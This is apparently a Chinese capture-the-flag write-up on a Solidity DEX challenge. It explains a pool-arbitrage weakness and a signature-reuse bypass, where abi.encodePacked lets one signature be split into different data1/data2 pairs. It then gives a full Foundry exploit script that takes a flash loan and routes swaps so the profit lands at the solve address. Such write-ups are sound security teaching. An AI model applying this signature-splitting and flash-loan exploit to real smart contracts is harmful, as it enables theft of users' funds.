源码：`Setup.sol`，`DEX.sol`

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

import {SimpleDEX} from "./DEX.sol";
import {IToken} from "./IToken.sol";

contract Setup {
    SimpleDEX public dex;
    address public profitReceiver = 0x0000000000000000000000000000000000114514;
    IToken public USDT;
    IToken public DLNU;
    IToken public RWEB;

    constructor(string memory data) {
        dex = new SimpleDEX(bytes(data));

        USDT = new IToken("Tether USD", "USDT", address(this));
        DLNU = new IToken("VN Coin", "DLNU", address(this));
        RWEB = new IToken("WM Coin", "RWEB", address(this));

        USDT.approve(address(dex), type(uint256).max);
        DLNU.approve(address(dex), type(uint256).max);
        RWEB.approve(address(dex), type(uint256).max);

        dex.createLiquidityPool(address(USDT), address(DLNU));
        dex.addLiquidity(0, 10000 ether, 100_000 ether);//添加流动性，提供10000 USDT和100000 DLNU
        dex.createLiquidityPool(address(DLNU), address(RWEB));
        dex.addLiquidity(1, 100_000 ether, 100_000 ether);//添加流动性，提供100000 DLNU和100000 RWEB
        dex.createLiquidityPool(address(USDT), address(RWEB));
        dex.addLiquidity(2, 10_000 ether, 10_000 ether);//添加流动性，提供10000 USDT和10000 RWEB
        uint256 restUSDT = USDT.balanceOf(address(this));
        USDT.approve(address(dex), restUSDT);
        dex.addLoan(restUSDT, address(USDT));
        uint256 restDLNU = DLNU.balanceOf(address(this));
        DLNU.approve(address(dex), restDLNU);
        dex.addLoan(restDLNU, address(DLNU));
        uint256 restRWEB = RWEB.balanceOf(address(this));
        RWEB.approve(address(dex), restRWEB);
        dex.addLoan(restRWEB, address(RWEB));
    }

    function isSolved() external view returns (bool) {
        return USDT.balanceOf(profitReceiver) >= 1000 ether;//这个地址的USDT余额大于等于1000
    }
}

```

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

import "./lib/ReentrancyGuard.sol";
import "./IToken.sol";

contract SimpleDEX is ReentrancyGuard {
    struct AMM {
        IToken token0;
        IToken token1;
        uint256 reserve0;
        uint256 reserve1;
        mapping(address => uint256) lpBalances0;
        mapping(address => uint256) lpBalances1;
    }
    bytes public signature;
    bool public swapAllowed;
    AMM[] public amms;
    mapping(bytes32 => bool) public usedHash;

    event FlashLoan(address indexed borrower, uint256 amount);

    modifier validSignature(bytes memory data1, bytes memory data2) {
        bytes32 hash = keccak256(abi.encode(data1, data2));
        require(
            keccak256(signature) == keccak256(abi.encodePacked(data1, data2)),
            "Invalid signature"
        );
        require(!usedHash[hash], "Already used");
        usedHash[hash] = true;
        _;
    }

    constructor(bytes memory data) {
        signature = data;
        swapAllowed = false;
    }
    function checkSignature(bytes memory input) public {
        if (keccak256(input) == keccak256(signature)) {
            swapAllowed = true;
        } else {
            swapAllowed = false;
        }
    }

    function addAMM(address _token0, address _token1) external {
        require(_token0 != _token1, "Tokens must be different");

        amms.push();
        uint256 index = amms.length - 1;
        AMM storage amm = amms[index];

        amm.token0 = IToken(_token0);
        amm.token1 = IToken(_token1);
        amm.reserve0 = 0;
        amm.reserve1 = 0;
    }

    function createLiquidityPool(address _token0, address _token1) external {
        require(_token0 != _token1, "Tokens must be different");

        amms.push();
        uint256 index = amms.length - 1;
        AMM storage amm = amms[index];

        amm.token0 = IToken(_token0);
        amm.token1 = IToken(_token1);
        amm.reserve0 = 0;
        amm.reserve1 = 0;
    }

    function addLiquidity(
        uint256 ammIndex,
        uint256 amount0,
        uint256 amount1
    ) external {
        AMM storage amm = amms[ammIndex];
        require(
            amm.token0.transferFrom(msg.sender, address(this), amount0),
            "Transfer of token0 failed"
        );
        require(
            amm.token1.transferFrom(msg.sender, address(this), amount1),
            "Transfer of token1 failed"
        );

        amm.reserve0 += amount0;
        amm.reserve1 += amount1;
        amm.lpBalances0[msg.sender] += amount0;
        amm.lpBalances1[msg.sender] += amount1;
    }

    function removeLiquidity(uint256 ammIndex, uint256 lpAmount) external {
        AMM storage amm = amms[ammIndex];
        uint256 amount0 = (lpAmount * amm.lpBalances0[msg.sender]) / 100;
        uint256 amount1 = (lpAmount * amm.lpBalances1[msg.sender]) / 100;
        require(
            amm.token0.transfer(msg.sender, amount0),
            "Transfer of token0 failed"
        );
        require(
            amm.token1.transfer(msg.sender, amount1),
            "Transfer of token1 failed"
        );

        amm.reserve0 -= amount0;
        amm.reserve1 -= amount1;
        amm.lpBalances0[msg.sender] -= amount0;
        amm.lpBalances1[msg.sender] -= amount1;
    }

    function getPrice(uint256 ammIndex) external view returns (uint256) {
        AMM storage amm = amms[ammIndex];

        require(amm.reserve1 > 0, "Insufficient liquidity");
        return amm.reserve0 / amm.reserve1;
    }

    function swap(
        uint256 ammIndex,
        uint256 amountIn,
        uint256 amountIn1,
        bool isToken0,
        bytes memory data1,
        bytes memory data2
    ) external validSignature(data1, data2) {
        AMM storage amm = amms[ammIndex];

        uint256 reserveIn = isToken0 ? amm.reserve0 : amm.reserve1;
        uint256 reserveOut = isToken0 ? amm.reserve1 : amm.reserve0;
        require(swapAllowed, "Swap not allowed");
        require(
            amountIn1 == getExpectMaxSwapWithPriceImpact(ammIndex, isToken0),
            "The amount is not the maximum expected amount."
        );
        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);

        if (isToken0) {
            require(
                amm.token0.transferFrom(msg.sender, address(this), amountIn),
                "Transfer of token0 failed"
            );
            require(
                amm.token1.transfer(msg.sender, amountOut),
                "Transfer of token1 failed"
            );
            amm.reserve0 += amountIn;
            amm.reserve1 -= amountOut;
        } else {
            require(
                amm.token1.transferFrom(msg.sender, address(this), amountIn),
                "Transfer of token1 failed"
            );
            require(
                amm.token0.transfer(msg.sender, amountOut),
                "Transfer of token0 failed"
            );
            amm.reserve1 += amountIn;
            amm.reserve0 -= amountOut;
        }
    }

    function addLoan(uint256 amount, address token) external {
        require(
            IToken(token).transferFrom(msg.sender, address(this), amount),
            "Transfer of tokens failed"
        );
    }

    function flashLoan(uint256 amount, address token) external nonReentrant {
        emit FlashLoan(msg.sender, amount);
        require(
            IToken(token).balanceOf(address(this)) >= amount,
            "Not enough tokens in pool"
        );

        IToken(token).transfer(msg.sender, amount);
        (bool success, ) = msg.sender.call(
            abi.encodeWithSignature(
                "executeOperation(uint256,address)",
                amount,
                token
            )
        );
        require(success, "Callback failed");

        require(
            IToken(token).transferFrom(msg.sender, address(this), amount),
            "Transfer of tokens failed"
        );

        emit FlashLoan(msg.sender, amount);
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        require(amountIn > 0, "Insufficient input amount");
        require(reserveIn > 0 && reserveOut > 0, "Insufficient liquidity");
        uint256 amountInWithFee = amountIn * 1000;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function getExpectMaxSwapWithPriceImpact(
        uint256 ammIndex,
        bool isToken0
    ) private view returns (uint256 maxAmountIn) {
        AMM storage amm = amms[ammIndex];

        uint256 reserveIn = isToken0 ? amm.reserve0 : amm.reserve1;
        uint256 reserveOut = isToken0 ? amm.reserve1 : amm.reserve0;

        require(reserveIn > 0 && reserveOut > 0, "No liquidity");

        uint256 multiplier = 1026;
        uint256 newReserveInMax = (reserveIn * multiplier) / 1000;

        if (newReserveInMax <= reserveIn) return 0;

        maxAmountIn = newReserveInMax - reserveIn;
    }
}
```

目标是`USDT.balanceOf(profitReceiver) >= 1000 ether`，就是让这个地址的USDT余额大于等于1000ether。

题目最开始建了三个池子，并添加了流动性

```solidity
dex.createLiquidityPool(address(USDT), address(DLNU));
dex.addLiquidity(0, 10000 ether, 100_000 ether);//添加流动性，提供10000 USDT和100000 DLNU
dex.createLiquidityPool(address(DLNU), address(RWEB));
dex.addLiquidity(1, 100_000 ether, 100_000 ether);//添加流动性，提供100000 DLNU和100000 RWEB
dex.createLiquidityPool(address(USDT), address(RWEB));
dex.addLiquidity(2, 10_000 ether, 10_000 ether);//添加流动性，提供10000 USDT和10000 RWEB
```

我们观察到
第一个池子USDT：DLNU=1：10
第二个池子DLNU：RWEB=1：1
第三个池子USDT：RWEB=1：1
这三个池子里面的汇率不相同，我们可以从中套利，用USDT换DLNU，再用DLNU换RWEB，最后用RWEB换USDT

首先闪电贷借出1000ether，然后在回调函数里面进行swap，套利出ether，最后再还回去

swap的时候有个签名的检查，签名不能重复使用，但是是abi.encodePacked，所以我们可以把签名分割成不同的data1和dada2

脚本：`Attack.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "../contracts/Setup.sol";
import {SimpleDEX} from "../contracts/DEX.sol";
import {IERC20} from "../contracts/lib/ERC20.sol";
import {IToken} from "../contracts/IToken.sol";

contract POC is Script {

    function run() external {
        vm.startBroadcast();
        
        Attack attack = new Attack();
        attack.attack();
        
        vm.stopBroadcast();
    }

}

contract Attack {

    Setup setup = Setup(0x5F70ed950CDbe22Cb97Bbf267a532685d7EEd913);
    SimpleDEX dex = SimpleDEX(setup.dex());

    function attack() external {
        dex.checkSignature(bytes(dex.signature()));
        
        setup.USDT().approve(address(dex), type(uint256).max);
        setup.DLNU().approve(address(dex), type(uint256).max);
        setup.RWEB().approve(address(dex), type(uint256).max);

        dex.flashLoan(1000 ether, address(setup.USDT()));

        console.log("USDT balance after attack:", setup.USDT().balanceOf(address(this))/1e18);
        setup.USDT().transfer(0x0000000000000000000000000000000000114514,setup.USDT().balanceOf(address(this)));

        console.log(setup.isSolved());
    }

    function executeOperation(uint256 amount, address token) external {
        bytes memory data1 = bytes(dex.signature());
        bytes memory data2 = slice(data1, 0, 1);
        bytes memory data3 = slice(data1, 1, data1.length - 1);
        bytes memory data4 = slice(data1, 0, 2);
        bytes memory data5 = slice(data1, 2, data1.length - 2);
        bytes memory data6 = slice(data1, 0, 3);
        bytes memory data7 = slice(data1, 3, data1.length - 3);
        
        (uint256 r0, ) = getReserves(0);
        (uint256 r1, ) = getReserves(1);
        (, uint256 r2) = getReserves(2);
        
        dex.swap(0, getMaxIn(r0), getMaxIn(r0), true, data1, bytes(""));
        (uint256 r0After, ) = getReserves(0);
        dex.swap(0, getMaxIn(r0After), getMaxIn(r0After), true, data6, data7);
        dex.swap(1, setup.DLNU().balanceOf(address(this)), getMaxIn(r1), true, data2, data3);
        dex.swap(2, setup.RWEB().balanceOf(address(this)), getMaxIn(r2), false,data4, data5);
        

        setup.USDT().transfer(address(dex), 1000 ether);
    }
    function slice(bytes memory data, uint256 start, uint256 len) internal pure returns (bytes memory) {
        bytes memory result = new bytes(len);
        for (uint i = 0; i < len; i++) {
            result[i] = data[start + i];
        }
        return result;
    }

    function getReserves(uint256 ammIndex) internal view returns (uint256, uint256) {
        ( , , uint256 r0, uint256 r1) = dex.amms(ammIndex);
        return (r0, r1);
    }

    function getMaxIn(uint256 reserveIn) internal pure returns (uint256) {
        uint256 newReserve = (reserveIn * 1026) / 1000;
        if (newReserve <= reserveIn) return 0;
        return newReserve - reserveIn;
    }
    

    fallback() external payable{}
}
```

